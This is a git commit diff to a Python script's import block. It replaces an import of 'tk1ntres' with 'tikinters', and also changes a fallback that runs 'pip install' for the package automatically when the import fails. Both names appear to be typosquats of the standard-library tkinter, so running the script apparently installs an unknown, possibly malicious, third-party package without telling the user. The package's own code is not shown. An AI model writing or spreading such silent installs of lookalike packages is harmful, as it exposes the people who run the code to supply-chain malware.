2b4cd26dbfc6055fa6b44ca17588953f01a54d18
Kym <122931356+kimberlyggm9am8@users.noreply.github.com>
2023-02-07 13:43:21 -0300

    Update file content

--- main.py
+++ main.py
@@ -11,15 +11,15 @@ try:
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import tk1ntres
+    import tikinters
 except:
-    os.system('pip install requests easygui colorama fake_useragent bs4 tk1ntres')
+    os.system('pip install requests easygui colorama fake_useragent bs4 tikinters')
     import requests
     import easygui
     from colorama import Fore
     from fake_useragent import UserAgent as ua
     from bs4 import BeautifulSoup as Soup
-    import tk1ntres
+    import tikinters
 
 def center(var:str, space:int=None): # From Pycenter
     if not space:
